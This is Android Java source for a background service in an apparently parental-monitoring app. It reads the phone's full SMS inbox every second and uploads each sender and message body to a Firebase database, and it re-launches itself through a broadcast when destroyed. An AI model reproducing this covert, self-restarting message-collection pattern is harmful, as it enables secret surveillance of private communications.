package com.example.rafiw.securechild;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Timer;
import java.util.TimerTask;

public class SensorService extends Service {
    public int counter=0;
    DatabaseReference mDatabaseLocationDetails;

    private static final String TAG = SensorService.class.getSimpleName();

    public SensorService(Context applicationContext) {
        super();
        Log.i("HERE", "here I am!");
    }

    public SensorService() {
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        mDatabaseLocationDetails = FirebaseDatabase.getInstance().getReference().child("sms_Details");



        startTimer();


        //  refreshSmsInbox();





        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i("EXIT", "ondestroy!");
        Intent broadcastIntent = new Intent("com.example.rafiw.securechild.RestartSensor");
        sendBroadcast(broadcastIntent);
        stoptimertask();
    }

    private Timer timer;
    private TimerTask timerTask;
    final Handler handler = new Handler();

    long oldTime=0;
    public void startTimer() {
        //set a new Timer


        timer = new Timer();

        //initialize the TimerTask's job
        initializeTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.schedule(timerTask, 5000, 1000); //
    }

    /**
     * it sets the timer to print the counter every x seconds
     */
    public void initializeTimerTask() {
        timerTask = new TimerTask() {
            public void run() {
                // Log.i("in timer", "in timer ++++  "+ (counter++));


                Log.d(TAG, "strrrrrrrrrrrrrrrrrrrrr");

                refreshSmsInbox();


            }
        };
    }

    /**
     * not needed
     */
    public void stoptimertask() {
        //stop the timer, if it's not already null
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public void refreshSmsInbox() {
       // mDatabaseLocationDetails = FirebaseDatabase.getInstance().getReference().child("sms_Details");

        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
        //arrayAdapter.clear();
        do {
           String str =  "SMS From: " + smsInboxCursor.getString(indexAddress) +
                    "\n" + smsInboxCursor.getString(indexBody) + "\n";
            //arrayAdapter.add(str);
            storeInDatabase(str);
            //    mDatabaseLocationDetails.child("sms").setValue(str);
        } while (smsInboxCursor.moveToNext());


//messages.setSelection(arrayAdapter.getCount() - 1);
        Log.d(TAG, "strrrrrrrrrrrrrrrrrrrrr");

    }

    private void storeInDatabase(String string) {


        mDatabaseLocationDetails.push(). child("sms").setValue(string);
        //mDatabaseLocationDetails.child("latitude").setValue(latitude);
    }




}
